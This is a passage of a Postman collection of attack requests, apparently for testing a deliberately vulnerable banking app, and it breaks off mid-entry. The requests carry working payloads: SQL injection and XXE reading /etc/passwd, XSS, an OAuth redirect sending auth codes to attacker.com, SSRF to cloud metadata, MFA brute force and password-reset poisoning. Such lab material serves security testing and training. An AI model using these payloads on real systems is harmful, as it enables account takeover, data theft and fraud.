  "item": [
    {
      "name": "Auth",
      "item": [
        {
          "name": "SQLi Login Bypass",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/login", "host": ["{{base_url}}"], "path": ["login"]},
            "body": {
              "mode": "raw",
              "raw": "{\"username\": \"' OR '1'='1' --\", \"password\": \"anything\"}"
            },
            "description": "CWE-89: SQL Injection in login. Username payload (' OR '1'='1' --) bypasses authentication. Observe: 200 OK with valid session token."
          }
        },
        {
          "name": "Login Valid User",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/login", "host": ["{{base_url}}"], "path": ["login"]},
            "body": {
              "mode": "raw",
              "raw": "{\"username\": \"alice\", \"password\": \"alice123\"}"
            },
            "description": "Normal login to get session cookie for subsequent requests."
          }
        },
        {
          "name": "SAML XXE via auth",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/xml"}],
            "url": {"raw": "{{base_url}}/api/auth/saml", "host": ["{{base_url}}"], "path": ["api", "auth", "saml"]},
            "body": {
              "mode": "raw",
              "raw": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><SAMLResponse><Assertion>&xxe;</Assertion></SAMLResponse>"
            },
            "description": "CWE-611: XXE injection via SAML endpoint. Payload reads /etc/passwd via XML external entity. Observe: file contents reflected in response."
          }
        }
      ]
    },
    {
      "name": "SQL Injection",
      "item": [
        {
          "name": "SQLi User Profile",
          "request": {
            "method": "GET",
            "url": {"raw": "{{base_url}}/profile/' UNION SELECT 1,username,password,4,5,6 FROM users--", "host": ["{{base_url}}"], "path": ["profile", "' UNION SELECT 1,username,password,4,5,6 FROM users--"]},
            "description": "CWE-89: UNION-based SQL injection in profile endpoint. Extracts usernames and password hashes from users table. Observe: user data in response."
          }
        },
        {
          "name": "SQLi Search XSS",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/search?q=<script>alert(1)</script>",
              "host": ["{{base_url}}"],
              "path": ["search"],
              "query": [{"key": "q", "value": "<script>alert(1)</script>"}]
            },
            "description": "CWE-79 + CWE-89: Reflected XSS and SQLi in search endpoint. Payload executes JavaScript in victim browser. Observe: script tag reflected unescaped."
          }
        },
        {
          "name": "SQLi Transaction IDOR",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/transactions/1' OR '1'='1",
              "host": ["{{base_url}}"],
              "path": ["api", "transactions", "1' OR '1'='1"]
            },
            "description": "CWE-89 + CWE-285: SQLi and IDOR in transaction lookup. Any transaction accessible without ownership check. Observe: transaction data returned."
          }
        },
        {
          "name": "Bulk Transfer Race Condition",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/transfer/bulk", "host": ["{{base_url}}"], "path": ["api", "transfer", "bulk"]},
            "body": {
              "mode": "raw",
              "raw": "{\"transfers\": [{\"to\": \"bob\", \"amount\": 100}, {\"to\": \"charlie\", \"amount\": 100}]}"
            },
            "description": "CWE-362: Race condition/TOCTOU in bulk transfer. Balance checked once then debited N times. Run concurrent requests to overdraw account."
          }
        },
        {
          "name": "Negative Transfer (Business Logic)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/transfer/negative", "host": ["{{base_url}}"], "path": ["api", "transfer", "negative"]},
            "body": {
              "mode": "raw",
              "raw": "{\"to\": \"alice\", \"amount\": -9999}"
            },
            "description": "CWE-840: Business logic flaw — negative amount steals funds from recipient. Observe: recipient balance decreases, sender gains."
          }
        }
      ]
    },
    {
      "name": "OAuth",
      "item": [
        {
          "name": "OAuth Open Redirect (redirect_uri)",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/oauth/authorize?client_id=evil&redirect_uri=https://attacker.com/steal&response_type=code",
              "host": ["{{base_url}}"],
              "path": ["api", "oauth", "authorize"],
              "query": [
                {"key": "client_id", "value": "evil"},
                {"key": "redirect_uri", "value": "https://attacker.com/steal"},
                {"key": "response_type", "value": "code"}
              ]
            },
            "description": "CWE-601: Open redirect via redirect_uri. redirect_uri not validated against whitelist — auth code sent to attacker domain. Observe: 302 redirect to attacker.com with code param."
          }
        },
        {
          "name": "OAuth SSRF via token_endpoint",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/oauth/callback?code=test123&token_endpoint=http://169.254.169.254/latest/meta-data/",
              "host": ["{{base_url}}"],
              "path": ["api", "oauth", "callback"],
              "query": [
                {"key": "code", "value": "test123"},
                {"key": "token_endpoint", "value": "http://169.254.169.254/latest/meta-data/"}
              ]
            },
            "description": "CWE-918: SSRF via token_endpoint parameter. Server fetches attacker-controlled URL — can reach internal metadata endpoints. Observe: AWS metadata or internal service response."
          }
        },
        {
          "name": "OAuth Token Exchange (Hardcoded Secret)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/x-www-form-urlencoded"}],
            "url": {"raw": "{{base_url}}/api/oauth/token", "host": ["{{base_url}}"], "path": ["api", "oauth", "token"]},
            "body": {
              "mode": "urlencoded",
              "urlencoded": [
                {"key": "client_id", "value": "test"},
                {"key": "client_secret", "value": "oauth-client-secret-2024"},
                {"key": "code", "value": "anycode"},
                {"key": "grant_type", "value": "authorization_code"}
              ]
            },
            "description": "CWE-798: Hardcoded client_secret 'oauth-client-secret-2024'. CWE-330: Weak token from random.randint. Observe: access_token issued with predictable integer value."
          }
        },
        {
          "name": "OAuth SQLi in client_id",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/x-www-form-urlencoded"}],
            "url": {"raw": "{{base_url}}/api/oauth/token", "host": ["{{base_url}}"], "path": ["api", "oauth", "token"]},
            "body": {
              "mode": "urlencoded",
              "urlencoded": [
                {"key": "client_id", "value": "' OR '1'='1"},
                {"key": "client_secret", "value": "oauth-client-secret-2024"},
                {"key": "code", "value": "' OR '1'='1"},
                {"key": "grant_type", "value": "authorization_code"}
              ]
            },
            "description": "CWE-89: SQLi in client_id and code params during token exchange. Observe: SQL error or token issued without valid code."
          }
        },
        {
          "name": "OAuth Revoke Any Token (No Auth)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/x-www-form-urlencoded"}],
            "url": {"raw": "{{base_url}}/api/oauth/revoke", "host": ["{{base_url}}"], "path": ["api", "oauth", "revoke"]},
            "body": {
              "mode": "urlencoded",
              "urlencoded": [{"key": "token", "value": "victim_token_here"}]
            },
            "description": "CWE-285: No authentication required to revoke any token. Any unauthenticated attacker can revoke other users' tokens. Observe: 200 OK, token revoked."
          }
        }
      ]
    },
    {
      "name": "MFA Bypass",
      "item": [
        {
          "name": "MFA Master Bypass Code",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/mfa/verify", "host": ["{{base_url}}"], "path": ["api", "mfa", "verify"]},
            "body": {
              "mode": "raw",
              "raw": "{\"user_id\": \"1\", \"code\": \"000000\"}"
            },
            "description": "CWE-798: Hardcoded master bypass code '000000'. Any user_id + code '000000' bypasses MFA entirely. Observe: {'status': 'verified', 'method': 'master_bypass'}."
          }
        },
        {
          "name": "MFA Brute Force (No Lockout)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/mfa/verify", "host": ["{{base_url}}"], "path": ["api", "mfa", "verify"]},
            "body": {
              "mode": "raw",
              "raw": "{\"user_id\": \"1\", \"code\": \"123456\"}"
            },
            "description": "CWE-307: No brute-force lockout. Send unlimited attempts with different 6-digit codes. Run in a loop 0-999999. Observe: never locked out."
          }
        },
        {
          "name": "MFA Backup Codes (No Auth)",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/mfa/backup-codes?user_id=1",
              "host": ["{{base_url}}"],
              "path": ["api", "mfa", "backup-codes"],
              "query": [{"key": "user_id", "value": "1"}]
            },
            "description": "CWE-285: No authentication required to retrieve backup codes. Any unauthenticated user can get backup codes for any user_id. Observe: 8 backup codes returned."
          }
        },
        {
          "name": "MFA Disable (No Password)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/mfa/disable", "host": ["{{base_url}}"], "path": ["api", "mfa", "disable"]},
            "body": {
              "mode": "raw",
              "raw": "{\"user_id\": \"1\"}"
            },
            "description": "CWE-285: No password re-verification to disable MFA. Any request with a user_id disables that user's MFA. CWE-89: SQLi in user_id. Observe: MFA disabled without authentication."
          }
        },
        {
          "name": "MFA Setup (Weak Secret)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/mfa/setup", "host": ["{{base_url}}"], "path": ["api", "mfa", "setup"]},
            "body": {
              "mode": "raw",
              "raw": "{\"user_id\": \"1\"}"
            },
            "description": "CWE-330: TOTP secret generated with random.random() — not cryptographically secure. CWE-312: Secret stored in plaintext. Observe: totp_secret returned in response body."
          }
        }
      ]
    },
    {
      "name": "Password Reset",
      "item": [
        {
          "name": "Host Header Injection (Reset Poisoning)",
          "request": {
            "method": "POST",
            "header": [
              {"key": "Content-Type", "value": "application/json"},
              {"key": "Host", "value": "attacker.com"}
            ],
            "url": {"raw": "{{base_url}}/api/reset/request", "host": ["{{base_url}}"], "path": ["api", "reset", "request"]},
            "body": {
              "mode": "raw",
              "raw": "{\"email\": \"alice@vulnbank.com\"}"
            },
            "description": "CWE-20: Host header injection — reset URL built from HTTP Host header. Set Host: attacker.com to make reset link point to attacker domain. Observe: debug_reset_url contains attacker.com."
          }
        },
        {
          "name": "Reset SQLi in Email",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/reset/request", "host": ["{{base_url}}"], "path": ["api", "reset", "request"]},
            "body": {
              "mode": "raw",
              "raw": "{\"email\": \"' OR '1'='1' --\"}"
            },
            "description": "CWE-89: SQLi in email lookup during password reset. Payload matches all users. Observe: reset token generated for injected query result."
          }
        },
        {
          "name": "Reset Confirm (MD5 Password + Replay)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/reset/confirm", "host": ["{{base_url}}"], "path": ["api", "reset", "confirm"]},
            "body": {
              "mode": "raw",
              "raw": "{\"token\": \"123456\", \"new_password\": \"hacked123\"}"
            },
            "description": "CWE-916: New password hashed with MD5 (no salt). CWE-330: Token never invalidated — replay the same token multiple times. CWE-89: SQLi in token lookup."
          }
        },
        {
          "name": "Email Enumeration (Timing Oracle)",
          "request": {
            "method": "GET",
            "url": {
              "raw": "{{base_url}}/api/reset/validate?email=alice@vulnbank.com",
              "host": ["{{base_url}}"],
              "path": ["api", "reset", "validate"],
              "query": [{"key": "email", "value": "alice@vulnbank.com"}]
            },
            "description": "CWE-208: Timing oracle — valid emails get 500ms sleep + different message. Compare response time for valid vs invalid email to enumerate accounts. Observe: 'Email found' message and ~500ms delay for valid email."
          }
        }
      ]
    },
    {
      "name": "GraphQL",
      "item": [
        {
          "name": "GraphQL Introspection (Schema Leak)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/graphql", "host": ["{{base_url}}"], "path": ["api", "graphql"]},
            "body": {
              "mode": "raw",
              "raw": "{\"query\": \"{ __schema { types { name fields } } }\"}"
            },
            "description": "CWE-200: Introspection enabled in production — full schema including sensitive fields (password, card_number, totp_secret) exposed. Observe: complete schema returned."
          }
        },
        {
          "name": "GraphQL SQLi + IDOR (User Data)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/graphql", "host": ["{{base_url}}"], "path": ["api", "graphql"]},
            "body": {
              "mode": "raw",
              "raw": "{\"query\": \"{ user(id: \\\"1 OR 1=1\\\") { email balance card_number password } }\"}"
            },
            "description": "CWE-89 + CWE-285: SQLi via user id field. Resolver executes f'SELECT {fields} FROM users WHERE id={id}'. IDOR — no ownership check. Observe: sensitive user data including card_number and password hash."
          }
        },
        {
          "name": "GraphQL Batch DoS (No Limit)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/graphql/batch", "host": ["{{base_url}}"], "path": ["api", "graphql", "batch"]},
            "body": {
              "mode": "raw",
              "raw": "[{\"query\": \"{ user(id: \\\"1\\\") { email } }\"}, {\"query\": \"{ user(id: \\\"2\\\") { email } }\"}, {\"query\": \"{ user(id: \\\"3\\\") { email } }\"}, {\"query\": \"{ user(id: \\\"4\\\") { email } }\"}, {\"query\": \"{ user(id: \\\"5\\\") { email } }\"}]"
            },
            "description": "CWE-400: No batch size limit — 100+ queries in one request causes DoS. Each query runs independently. Scale the array to 100+ items. Observe: server processes all without limit."
          }
        },
        {
          "name": "GraphQL Field Injection (card_number)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/graphql", "host": ["{{base_url}}"], "path": ["api", "graphql"]},
            "body": {
              "mode": "raw",
              "raw": "{\"query\": \"{ user(id: \\\"2\\\") { email balance card_number totp_secret } }\"}"
            },
            "description": "CWE-285: No field-level authorization — any user can query any other user's card_number and totp_secret. Observe: PAN and TOTP secret returned for user id=2."
          }
        }
      ]
    },
    {
      "name": "JWT",
      "item": [
        {
          "name": "JWT Login (Get Token)",
          "request": {
            "method": "POST",
            "header": [{"key": "Content-Type", "value": "application/json"}],
            "url": {"raw": "{{base_url}}/api/jwt/login", "host": ["{{base_url}}"], "path": ["api", "jwt", "login"]},
